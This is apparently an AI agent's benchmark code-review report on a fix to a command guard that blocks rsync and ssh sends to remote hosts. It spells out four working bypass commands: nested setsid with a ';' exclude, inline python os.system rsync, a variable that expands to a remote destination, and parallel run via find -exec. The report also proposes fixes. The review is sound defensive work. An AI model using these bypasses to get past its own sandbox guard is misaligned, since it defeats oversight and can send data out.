[jobs:job-done] job 261106-151024-991d BENCH-REVIEW M #155 sonnet-medium succeeded · 59 turns · cost unknown · 4m · model gpt-6.1-sol · effort high

## Not done / uncertain

Guard tests and `scripts/check.sh` were not run successfully because compilation requires writable storage. Findings are source-verified; runtime `Check` reproductions remain unrun. No rsync/ssh payloads, socket-bound checks, subagents, edits or commits.

## Progress

- 17:26 UTC Inspected diff and prioritized guard/external-send paths.
- 17:27 UTC Attempted targeted tests; confirmed read-only cache failure.
- 17:28 UTC Traced remaining bypass conditions and checked formatting.
- 17:29 UTC Verified shell expansion and Python syntax; confirmed clean worktree.

BENCH-VERDICT: critical=0 high=3 medium=1 low=0 issue_fixed=partly

## Summary
Verdict: BLOCK
Risky areas: guard/sandbox and external sends.
Reviewed `8f6e8f9..6732627`. The original examples are addressed, but four fix conditions remain open.

## Findings / Changes

### Delivered

- **High — open: contextual terminators**, `internal/guard/guard.go:1546`. `setsid setsid rsync --exclude ';' ./src/ host:/dst/` still hides the remote operand. The nested-runner branch calls `execArgv`, which truncates at `;` despite there being no find command. **Fix:** apply find terminators only inside a parsed find action. Verified by tracing the runner branch and resulting `["--exclude"]` argv.

- **High — open: inline interpreter code**, `internal/guard/guard.go:1532`. `python3 -c'import os; os.system("rsync a host:/b")'` escapes the new check. `inlineCode` delegates to `interpCode`, which returns `-1` for attached code at line 644. **Fix:** recognize attached interpreter programs before checking rsync mentions. Verified through the helper implementation, shell tokenization and Python AST parsing; the payload was not executed.

- **High — open: dynamic operands**, `internal/guard/guard.go:1361`. `DST=' host:/dst/'; setsid rsync ./src/ ./dst/$DST` passes the local-prefix exception, although expansion produces `./src/`, `./dst/`, `host:/dst/`. The destination is remote. **Fix:** propagate `simpleCmd.bare`; permit the prefix exception only when expansion preserves one argument. Verified with shell builtins printing the expanded argv and tracing the guard checks.

- **Medium — open: nested parallel**, `internal/guard/guard.go:1550`. `printf '%s\n' host:/dst/ | find . -maxdepth 0 -exec parallel -j1 rsync ./src/ \;` escapes detection because the preceding word is `-j1`, rather than `parallel`. The adjacent-word check at line 1503 also misses nested ssh with options. **Fix:** parse nested runner options and preserve their stdin-derived argument status. Verified by source tracing.

- **Closed:** the separate `--log-file-format` value is consumed at `internal/guard/guard.go:1403`; quoted filter data is exempted at line 2603. The three original High spellings are also covered by the implementation and regression cases.

All four open conditions were visible from the brief’s named requirements; no brief gaps.

### Design

The changes follow the requested approach, but argument scanning still loses execution context and whether expansion can create multiple arguments.

### Code

`internal/guard/issue155_test.go:15` covers the requested examples and useful local-copy controls. Add block-expected cases for the four variants above; current tests omit those boundaries.

### Blocking

- `internal/guard/guard.go:1546`: High — restrict terminator handling to find actions.
- `internal/guard/guard.go:1532`: High — detect attached interpreter code.
- `internal/guard/guard.go:1361`: High — reject unverifiable argument splitting.
- `internal/guard/guard.go:1550`: Medium — recognize nested parallel commands after options.

### Non-blocking

none

## Evidence

- Read the complete fix diff and relevant parser, interpreter and guard checks.
- `git diff --check` and `gofmt -l` on changed Go files: clean.
- Targeted `go test`: unavailable; build-cache creation failed with `read-only file system`.
- Builtin-only argv inspection confirmed the dynamic remote destination.
- Python AST parsing confirmed the attached program’s syntax.
- Final `git status --short`: clean.
